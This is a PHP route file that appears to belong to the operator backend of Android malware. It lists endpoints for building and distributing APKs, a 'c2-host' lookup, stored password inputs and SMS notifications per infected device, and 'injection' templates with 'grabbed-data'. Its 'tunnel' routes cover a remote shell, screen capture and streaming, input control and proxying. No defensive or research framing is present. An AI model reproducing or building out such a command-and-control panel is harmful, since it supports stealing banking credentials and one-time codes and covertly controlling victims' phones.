<?php
use think\facade\Route;

Route::post('api/auth/login', 'AuthController/login');
Route::post('api/auth/login-telegram-verify', 'AuthController/verifyTelegramLogin');
Route::get('api/auth/verify', 'AuthController/verify');
Route::post('api/auth/verify', 'AuthController/verify');
Route::post('api/auth/logout', 'AuthController/logout');
Route::post('api/auth/check-initialization', 'AuthController/checkInitialization');
Route::get('api/system/info', 'AuthController/systemInfo');
Route::get('api/users/login-logs', 'AuthController/loginLogs');
Route::delete('api/users/login-logs', 'AuthController/loginLogs');
Route::post('api/auth/change-password', 'AuthController/changePassword');

Route::get('api/device/list', 'DeviceController/listDevices');
Route::get('api/device/groups', 'DeviceController/listGroups');
Route::get('api/device/:id', 'DeviceController/getDevice');
Route::delete('api/device/:id', 'DeviceController/deleteDevice');
Route::put('api/device/:id/assign', 'DeviceController/assignDevice');
Route::put('api/device/:id/remark', 'DeviceController/setRemark');

Route::get('api/users', 'UserController/listUsers');
Route::post('api/users', 'UserController/addUser');
Route::put('api/users/:id', 'UserController/updateUser');
Route::delete('api/users/:id', 'UserController/deleteUser');

Route::get('api/apk/info', 'ApkController/apkInfo');
Route::get('api/apk/list', 'ApkController/apkList');
Route::get('api/apk/build-status', 'ApkController/apkBuildStatus');
Route::get('api/apk/build-logs', 'ApkController/apkBuildLogs');
Route::get('api/apk/build-history', 'ApkController/apkBuildHistory');
Route::post('api/apk/build', 'ApkController/apkBuild');
Route::post('api/apk/delete', 'ApkController/apkDelete');
Route::post('api/apk/bulk-delete', 'ApkController/apkBulkDelete');
Route::rule('api/apk/download', 'ApkController/apkDownload', 'GET|HEAD');
Route::rule('api/apk/download/:filename', 'ApkController/apkDownloadFile', 'GET|HEAD');
Route::rule('api/apk/cdn-config', 'ApkController/cdnConfig', 'GET|POST|OPTIONS');
Route::rule('api/apk/bt-deploy-config', 'ApkController/btDeployConfig', 'GET|POST|OPTIONS');
Route::post('api/apk/bt-deploy-test', 'ApkController/btDeployTest');
Route::post('api/apk/cdn-test', 'ApkController/cdnTest');
Route::rule('api/apk/auto-build/config', 'ApkController/autoBuildConfig', 'GET|POST|OPTIONS');
Route::rule('api/apk/auto-build/targets', 'ApkController/autoBuildTargets', 'GET|POST|OPTIONS');
Route::delete('api/apk/auto-build/targets/:targetId', 'ApkController/autoBuildTargetDelete');
Route::get('api/ab-apk/latest-info', 'ApkController/latestInfo');
Route::get('api/apk/build-config/:buildId', 'ApkController/getBuildConfig');
Route::get('api/apk/check-name', 'ApkController/checkAppName');
Route::get('api/system/c2-host', 'ApkController/c2Host');
Route::get('api/sms/notifications', 'MiscController/smsNotifications');
Route::get('api/logs', 'DeviceController/getLogs');
Route::post('api/client/logs', 'AuthController/clientLogs');
Route::post('api/device/install-log', 'DeviceController/installLog');

Route::rule('api/password-inputs/:deviceId', 'DeviceController/getPasswordInputs', 'GET|DELETE|OPTIONS');
Route::delete('api/password-inputs/id/:inputId', 'MiscController/deletePasswordInput');

Route::get('api/injection/templates', 'InjectionController/listTemplates');
Route::post('api/injection/templates', 'InjectionController/addTemplate');
Route::get('api/injection/templates/:id', 'InjectionController/getTemplate');
Route::put('api/injection/templates/:id', 'InjectionController/updateTemplate');
Route::delete('api/injection/templates/:id', 'InjectionController/deleteTemplate');
Route::rule('api/injection/grabbed-data', 'InjectionController/grabbedData', 'GET|OPTIONS');
Route::rule('api/injection/active-tasks', 'InjectionController/activeTasks', 'GET|POST|DELETE|OPTIONS');
Route::rule('api/injection/global-configs', 'InjectionController/globalConfigs', 'GET|OPTIONS');
Route::rule('api/injection/global-configs/:configId', 'MiscController/injectionGlobalConfigDetail', 'GET|PUT|DELETE|OPTIONS');
Route::rule('api/injection/data', 'MiscController/injectionData', 'GET|DELETE|OPTIONS');
Route::get('api/injection/counts', 'MiscController/injectionCounts');

Route::rule('api/tunnel/config', 'TunnelController/config', 'GET|POST|OPTIONS');
Route::get('api/tunnel/status', 'TunnelController/status');
Route::rule('api/tunnel/deploy', 'TunnelController/deployed', 'GET|POST|OPTIONS');
Route::post('api/tunnel/shell', 'TunnelController/shell');
Route::post('api/tunnel/input', 'TunnelController/input');
Route::get('api/tunnel/screenshot', 'TunnelController/screenshot');
Route::get('api/tunnel/minicap-stream', 'TunnelController/minicapStream');
Route::get('api/tunnel/bootstrap', 'TunnelController/bootstrap');
Route::rule('api/tunnel/setDeviceId', 'TunnelController/setDeviceId', 'GET|POST|OPTIONS');
Route::get('api/tunnel/tunnel-status', 'TunnelController/tunnelStatus');
Route::post('api/tunnel/close-frps-proxy', 'TunnelController/closeFrpsProxy');
Route::rule('api/tunnel/blacklist', 'TunnelController/blacklist', 'GET|DELETE|OPTIONS');

Route::rule('m', 'MApiController/dispatch', 'GET|POST|PUT|DELETE|OPTIONS');
Route::rule('m/:any', 'MApiController/dispatch', 'GET|POST|PUT|DELETE|OPTIONS')->pattern(['any' => '.*']);
